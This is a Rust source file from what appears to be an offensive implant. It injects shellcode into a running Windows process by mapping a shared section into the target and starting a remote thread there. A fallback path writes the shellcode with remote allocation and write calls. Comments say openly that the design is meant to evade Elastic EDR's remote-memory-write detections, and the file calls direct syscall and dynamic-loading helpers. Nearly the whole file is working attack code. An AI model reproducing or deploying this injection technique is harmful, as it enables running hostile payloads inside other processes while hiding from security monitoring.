// injection.rs
// Shellcode injection via shared section mapping — no cross-process writes.
//
// Instead of VirtualAllocEx + WriteProcessMemory (which triggers "Remote
// Memory Write" detections in Elastic EDR), we:
//
//   1. NtCreateSection — page-file-backed shared memory (RWX capable)
//   2. NtMapViewOfSection into OUR process as RW — write shellcode locally
//   3. NtMapViewOfSection into TARGET process as RX — appears there via shared mapping
//   4. NtUnmapViewOfSection from our process — remove our local view
//   5. NtCreateThreadEx in the target at the remote mapped address
//
// No NtWriteVirtualMemory / WriteProcessMemory ever crosses process boundaries.
// No PPID spoofing — we only inject into already-running processes.

use std::ffi::c_void;
use std::ptr::null_mut;

use crate::dynload;
use crate::syscall::{
    init_syscalls,
    nt_create_section,
    nt_map_view_of_section,
    nt_unmap_view_of_section,
    nt_create_thread_ex,
    // Win32 fallback still uses these
    nt_alloc_virtual_memory,
    nt_write_virtual_memory,
    nt_protect_virtual_memory,
};
use crate::target_select::{find_inject_target, TargetResult};

const INJECT_ACCESS:       u32 = 0x0002 | 0x0008 | 0x0020; // VM_OPERATION | VM_WRITE | CREATE_THREAD
const PAGE_READWRITE:      u32 = 0x04;
const PAGE_EXECUTE_READ:   u32 = 0x20;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const MEM_COMMIT_RESERVE:  u32 = 0x3000;
const THREAD_ALL_ACCESS:   u32 = 0x001FFFFF;

// SECTION_* access rights
const SECTION_MAP_WRITE:   u32 = 0x0002;
const SECTION_MAP_READ:    u32 = 0x0004;
const SECTION_MAP_EXECUTE: u32 = 0x0008;
const SECTION_ALL_ACCESS:  u32 = 0x000F;

// SEC_COMMIT — page-file-backed section
const SEC_COMMIT:          u32 = 0x0800_0000;

// ViewUnmap — InheritDisposition for NtMapViewOfSection
const VIEW_UNMAP: u32 = 2;

pub fn inject(shellcode: &[u8]) -> Result<(), ()> {
    let target = find_inject_target().ok_or(())?;
    match target {
        TargetResult::Existing(pid) => inject_existing(pid, shellcode),
        TargetResult::ToSpawn(_)    => Err(()),
    }
}

// ── Section-mapped injection (preferred) ────────────────────────────────────

unsafe fn inject_section(proc: *mut c_void, shellcode: &[u8]) -> Result<(), ()> {
    let fn_close = dynload::close_handle().ok_or(())?;

    // 1. Create a page-file-backed shared section large enough for the shellcode
    let mut section_handle: *mut c_void = null_mut();
    let mut section_size: i64 = shellcode.len() as i64;
    let status = nt_create_section(
        &mut section_handle,
        SECTION_ALL_ACCESS,
        null_mut(),
        &mut section_size,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        null_mut(),
    );
    if status < 0 || section_handle.is_null() {
        return Err(());
    }

    // 2. Map into OUR process as RW so we can write the shellcode locally
    let self_proc = -1isize as *mut c_void; // NtCurrentProcess
    let mut local_base: *mut c_void = null_mut();
    let mut local_size: usize = 0;
    let mut offset: i64 = 0;
    let status = nt_map_view_of_section(
        section_handle,
        self_proc,
        &mut local_base,
        0,
        shellcode.len(),
        &mut offset,
        &mut local_size,
        VIEW_UNMAP,
        0,
        PAGE_READWRITE,
    );
    if status < 0 || local_base.is_null() {
        let _ = fn_close(section_handle);
        return Err(());
    }

    // Write shellcode into the local RW view — this is a local memcpy, NOT cross-process
    std::ptr::copy_nonoverlapping(shellcode.as_ptr(), local_base as *mut u8, shellcode.len());

    // 3. Map into TARGET process as RX
    let mut remote_base: *mut c_void = null_mut();
    let mut remote_size: usize = 0;
    let mut offset2: i64 = 0;
    let status = nt_map_view_of_section(
        section_handle,
        proc,
        &mut remote_base,
        0,
        shellcode.len(),
        &mut offset2,
        &mut remote_size,
        VIEW_UNMAP,
        0,
        PAGE_EXECUTE_READ,
    );
    if status < 0 || remote_base.is_null() {
        let _ = nt_unmap_view_of_section(self_proc, local_base);
        let _ = fn_close(section_handle);
        return Err(());
    }

    // 4. Unmap our local view — we no longer need it
    let _ = nt_unmap_view_of_section(self_proc, local_base);

    // 5. Create a thread in the target at the remote mapped address
    let mut h_thread: *mut c_void = null_mut();
    let status = nt_create_thread_ex(
        &mut h_thread, THREAD_ALL_ACCESS, null_mut(),
        proc, remote_base as *const c_void, null_mut(),
        0, 0, 0, 0, null_mut(),
    );
    if status >= 0 && !h_thread.is_null() {
        let _ = fn_close(h_thread);
    }

    let _ = fn_close(section_handle);
    Ok(())
}

// ── Win32 fallback (NtAllocate + NtWrite — only if section mapping fails) ────

unsafe fn inject_nt_fallback(proc: *mut c_void, shellcode: &[u8]) -> Result<(), ()> {
    let fn_close = dynload::close_handle().ok_or(())?;

    let mut base: *mut c_void = null_mut();
    let mut region_size = shellcode.len();
    let status = nt_alloc_virtual_memory(
        proc, &mut base, 0, &mut region_size,
        MEM_COMMIT_RESERVE, PAGE_READWRITE,
    );
    if status < 0 || base.is_null() {
        return Err(());
    }

    let status = nt_write_virtual_memory(
        proc, base,
        shellcode.as_ptr() as *const c_void, shellcode.len(), null_mut(),
    );
    if status < 0 {
        return Err(());
    }

    let mut protect_base = base;
    let mut protect_size = shellcode.len();
    let mut old: u32 = 0;
    nt_protect_virtual_memory(proc, &mut protect_base, &mut protect_size, PAGE_EXECUTE_READ, &mut old);

    let mut h_thread: *mut c_void = null_mut();
    let status = nt_create_thread_ex(
        &mut h_thread, THREAD_ALL_ACCESS, null_mut(),
        proc, base as *const c_void, null_mut(),
        0, 0, 0, 0, null_mut(),
    );
    if status >= 0 && !h_thread.is_null() {
        let _ = fn_close(h_thread);
    }

    Ok(())
}

// ── Dispatch ────────────────────────────────────────────────────────────────

unsafe fn do_inject(proc: *mut c_void, shellcode: &[u8]) -> Result<(), ()> {
    if !init_syscalls() {
        return Err(());
    }
    // Prefer section mapping (no cross-process writes).
    // Fall back to NtWrite only if section mapping fails.
    match inject_section(proc, shellcode) {
        Ok(()) => Ok(()),
        Err(_) => inject_nt_fallback(proc, shellcode),
    }
}

// ── Inject into an already-running process ──────────────────────────────────

fn inject_existing(pid: u32, shellcode: &[u8]) -> Result<(), ()> {
    unsafe {
        let fn_open  = dynload::open_process().ok_or(())?;
        let fn_close = dynload::close_handle().ok_or(())?;

        let handle = fn_open(INJECT_ACCESS, 0, pid);
        if handle.is_null() { return Err(()); }

        let result = do_inject(handle, shellcode);
        let _ = fn_close(handle);
        result
    }
}
